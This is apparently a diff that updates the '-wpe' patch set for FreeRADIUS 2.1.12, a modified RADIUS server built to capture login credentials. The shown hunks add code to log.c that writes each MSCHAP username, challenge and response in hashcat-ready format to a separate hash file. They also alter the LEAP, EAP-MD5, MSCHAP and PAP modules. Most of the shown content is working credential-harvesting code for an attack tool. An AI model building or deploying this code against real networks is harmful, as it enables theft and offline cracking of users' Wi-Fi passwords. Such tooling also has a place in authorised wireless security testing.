@@ -1,6 +1,7 @@
 diff -ur freeradius-server-2.1.12/raddb/radiusd.conf.in freeradius-server-2.1.12-wpe/raddb/radiusd.conf.in
 --- freeradius-server-2.1.12/raddb/radiusd.conf.in	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/raddb/radiusd.conf.in	2018-04-22 12:26:06.535765904 +0000
++++ freeradius-server-2.1.12-wpe/raddb/radiusd.conf.in	2018-04-22 14:30:22.482515851 +0000
 @@ -466,6 +466,7 @@
  
  #  The program to execute to do concurrency checks.
@@ -12,6 +13,7 @@ diff -ur freeradius-server-2.1.12/raddb/radiusd.conf.in freeradius-server-2.1.12
 diff -ur freeradius-server-2.1.12/raddb/users freeradius-server-2.1.12-wpe/raddb/users
 --- freeradius-server-2.1.12/raddb/users	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/raddb/users	2018-04-22 12:26:06.545765957 +0000
++++ freeradius-server-2.1.12-wpe/raddb/users	2018-04-22 14:30:22.482515851 +0000
 @@ -201,3 +201,6 @@
  # 	Service-Type = Administrative-User
  
@@ -22,6 +24,7 @@ diff -ur freeradius-server-2.1.12/raddb/users freeradius-server-2.1.12-wpe/raddb
 diff -ur freeradius-server-2.1.12/src/include/radiusd.h freeradius-server-2.1.12-wpe/src/include/radiusd.h
 --- freeradius-server-2.1.12/src/include/radiusd.h	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/include/radiusd.h	2018-04-22 12:26:06.545765957 +0000
++++ freeradius-server-2.1.12-wpe/src/include/radiusd.h	2018-04-22 14:30:22.482515851 +0000
 @@ -368,6 +368,7 @@
  #endif
  	char		*log_file;
@@ -44,6 +47,7 @@ diff -ur freeradius-server-2.1.12/src/main/auth.c freeradius-server-2.1.12-wpe/s
 diff -ur freeradius-server-2.1.12/src/main/log.c freeradius-server-2.1.12-wpe/src/main/log.c
 --- freeradius-server-2.1.12/src/main/log.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/main/log.c	2018-04-22 13:44:46.389074756 +0000
++++ freeradius-server-2.1.12-wpe/src/main/log.c	2018-04-22 16:01:22.149644576 +0000
 @@ -28,6 +28,9 @@
  
  #include <freeradius-devel/radiusd.h>
@@ -54,13 +58,14 @@ diff -ur freeradius-server-2.1.12/src/main/log.c freeradius-server-2.1.12-wpe/sr
  #ifdef HAVE_SYS_STAT_H
  #include <sys/stat.h>
  #endif
-@@ -181,6 +184,73 @@
+@@ -181,6 +184,89 @@
  	return r;
  }
  
 +void log_wpe(char *authtype, char *username, char *password, char *ssid, char *clientmac,  unsigned char *challenge, unsigned int challen, unsigned char *response, unsigned int resplen)
 + {
 +        FILE            *logfd;
++        FILE            *hashfd;
 +        time_t          nowtime;
 +        unsigned int    count;
 +
@@ -108,6 +113,21 @@ diff -ur freeradius-server-2.1.12/src/main/log.c freeradius-server-2.1.12-wpe/sr
 +        }
 +
 +	 if ( (strncmp(authtype, "mschap", 6) == 0) && username != NULL && challen != 0 && resplen != 0) {
++		hashfd = fopen(mainconfig.wpehashfile, "a");
++		if (hashfd != NULL) {
++			fprintf(hashfd, "%s::::",username);
++			for (count=0; count<resplen; count++) {
++	                        fprintf(hashfd, "%02x",response[count]);
++	                }
++			fprintf(hashfd,":");
++			for (count=0; count<challen; count++) {
++	                        fprintf(hashfd, "%02x",challenge[count]);
++	                }
++			fprintf(hashfd,"\n");
++			fclose(hashfd);
++		}
++	
++
 +		fprintf(logfd, "\thashcat: %s::::",username);
 +		for (count=0; count<resplen; count++) {
 +                        fprintf(logfd, "%02x",response[count]);
@@ -131,6 +151,7 @@ diff -ur freeradius-server-2.1.12/src/main/log.c freeradius-server-2.1.12-wpe/sr
 diff -ur freeradius-server-2.1.12/src/main/mainconfig.c freeradius-server-2.1.12-wpe/src/main/mainconfig.c
 --- freeradius-server-2.1.12/src/main/mainconfig.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/main/mainconfig.c	2018-04-22 12:26:06.565766063 +0000
++++ freeradius-server-2.1.12-wpe/src/main/mainconfig.c	2018-04-22 12:26:06.555766010 +0000
 @@ -232,7 +232,7 @@
  	{ "checkrad", PW_TYPE_STRING_PTR, 0, &mainconfig.checkrad, "${sbindir}/checkrad" },
  
@@ -143,6 +164,7 @@ diff -ur freeradius-server-2.1.12/src/main/mainconfig.c freeradius-server-2.1.12
 diff -ur freeradius-server-2.1.12/src/main/radiusd.c freeradius-server-2.1.12-wpe/src/main/radiusd.c
 --- freeradius-server-2.1.12/src/main/radiusd.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/main/radiusd.c	2018-04-22 12:26:06.565766063 +0000
++++ freeradius-server-2.1.12-wpe/src/main/radiusd.c	2018-04-22 14:30:22.502515948 +0000
 @@ -65,7 +65,7 @@
  int debug_flag = 0;
  int check_config = FALSE;
@@ -155,6 +177,7 @@ diff -ur freeradius-server-2.1.12/src/main/radiusd.c freeradius-server-2.1.12-wp
 diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c
 --- freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c	2018-04-22 12:26:06.565766063 +0000
++++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.c	2018-04-22 14:30:22.502515948 +0000
 @@ -244,11 +244,11 @@
   *	Verify the MS-CHAP response from the user.
   */
@@ -180,6 +203,7 @@ diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_lea
 diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h
 --- freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h	2018-04-22 12:26:06.575766116 +0000
++++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/eap_leap.h	2018-04-22 14:30:22.502515948 +0000
 @@ -68,7 +68,7 @@
  LEAP_PACKET 	*eapleap_extract(EAP_DS *auth);
  LEAP_PACKET 	*eapleap_initiate(EAP_DS *eap_ds, VALUE_PAIR *user_name);
@@ -192,6 +216,7 @@ diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/eap_lea
 diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c
 --- freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c	2018-04-22 12:26:06.575766116 +0000
++++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap_leap.c	2018-04-22 14:30:22.502515948 +0000
 @@ -133,7 +133,7 @@
  	switch (session->stage) {
  	case 4:			/* Verify NtChallengeResponse */
@@ -204,6 +229,7 @@ diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_leap/rlm_eap
 diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c
 --- freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c	2018-04-22 12:26:06.575766116 +0000
++++ freeradius-server-2.1.12-wpe/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.c	2018-04-22 14:30:22.512515996 +0000
 @@ -202,9 +202,13 @@
  	/*
  	 *	The length of the response is always 16 for MD5.
@@ -221,6 +247,7 @@ diff -ur freeradius-server-2.1.12/src/modules/rlm_eap/types/rlm_eap_md5/eap_md5.
 diff -ur freeradius-server-2.1.12/src/modules/rlm_mschap/rlm_mschap.c freeradius-server-2.1.12-wpe/src/modules/rlm_mschap/rlm_mschap.c
 --- freeradius-server-2.1.12/src/modules/rlm_mschap/rlm_mschap.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/modules/rlm_mschap/rlm_mschap.c	2018-04-22 12:26:06.585766169 +0000
++++ freeradius-server-2.1.12-wpe/src/modules/rlm_mschap/rlm_mschap.c	2018-04-22 14:30:22.512515996 +0000
 @@ -661,9 +661,23 @@
  static int do_mschap(rlm_mschap_t *inst,
  		     REQUEST *request, VALUE_PAIR *password,
@@ -279,6 +306,7 @@ diff -ur freeradius-server-2.1.12/src/modules/rlm_mschap/rlm_mschap.c freeradius
 diff -ur freeradius-server-2.1.12/src/modules/rlm_pap/rlm_pap.c freeradius-server-2.1.12-wpe/src/modules/rlm_pap/rlm_pap.c
 --- freeradius-server-2.1.12/src/modules/rlm_pap/rlm_pap.c	2011-09-30 14:12:07.000000000 +0000
 +++ freeradius-server-2.1.12-wpe/src/modules/rlm_pap/rlm_pap.c	2018-04-22 12:26:06.595766222 +0000
++++ freeradius-server-2.1.12-wpe/src/modules/rlm_pap/rlm_pap.c	2018-04-22 14:30:22.522516044 +0000
 @@ -515,12 +515,26 @@
  	char buff[MAX_STRING_LEN];
  	char buff2[MAX_STRING_LEN + 50];
